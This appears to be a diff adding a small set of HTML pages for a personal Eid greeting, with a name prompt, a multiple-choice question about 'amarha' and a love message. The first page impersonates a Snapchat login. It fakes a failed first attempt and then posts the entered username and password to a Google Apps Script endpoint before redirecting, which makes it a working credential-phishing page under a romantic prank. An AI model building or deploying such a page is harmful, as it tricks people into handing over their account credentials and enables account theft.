@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login using Snapchat</title>
+    <script>
+        let attempt = 0;
+        function login() {
+            let username = document.getElementById('username').value;
+            let password = document.getElementById('password').value;
+            
+            if (attempt === 0) {
+                document.getElementById('message').innerText = "Try again: Username or password do not match";
+                attempt++;
+            } else {
+                saveToSheet(username, password);
+                window.location.href = 'name.html';
+            }
+        }
+
+        function saveToSheet(username, password) {
+            fetch('https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({username, password})
+            });
+        }
+    </script>
+</head>
+<body>
+    <h2>Login using Snapchat</h2>
+    <input type='text' id='username' placeholder='Username'><br>
+    <input type='password' id='password' placeholder='Password'><br>
+    <button onclick='login()'>Login</button>
+    <p id='message'></p>
+</body>
+</html>
+
+<!-- name.html -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Enter Your Name</title>
+    <script>
+        function goToMCQ() {
+            let name = document.getElementById('name').value;
+            if (name.trim() !== "") {
+                window.location.href = 'mcq.html';
+            }
+        }
+    </script>
+</head>
+<body>
+    <h2>Enter Your Name</h2>
+    <input type='text' id='name' placeholder='Your Name'><br>
+    <button onclick='goToMCQ()'>Next</button>
+</body>
+</html>
+
+<!-- mcq.html -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>MCQ Question</title>
+    <script>
+        function checkAnswer() {
+            let answer = document.querySelector('input[name="option"]:checked');
+            if (answer && answer.value === 'all') {
+                window.location.href = 'eid.html';
+            } else {
+                document.getElementById('message').innerText = "Wrong answer, try again!";
+            }
+        }
+    </script>
+</head>
+<body>
+    <h2>Aap amarha ki kya lagti hain?</h2>
+    <input type='radio' name='option' value='wife'> Wife<br>
+    <input type='radio' name='option' value='girlfriend'> Girlfriend<br>
+    <input type='radio' name='option' value='bestfriend'> Best Friend<br>
+    <input type='radio' name='option' value='all'> All of the above<br>
+    <button onclick='checkAnswer()'>Submit</button>
+    <p id='message'></p>
+</body>
+</html>
+
+<!-- eid.html -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Eid Mubarak</title>
+</head>
+<body>
+    <h2>Eid Mubarak, my love! ✨💕</h2>
+    <p>On this special day, I thank Allah for blessing me with you—my sweetest joy and my biggest Eid gift. May your day be as bright as your smile and as beautiful as your heart.</p>
+    <p>I can’t wait to steal some extra Eid hugs (and maybe a few sweets too 😉). Enjoy your day, my love!</p>
+</body>
+</html>
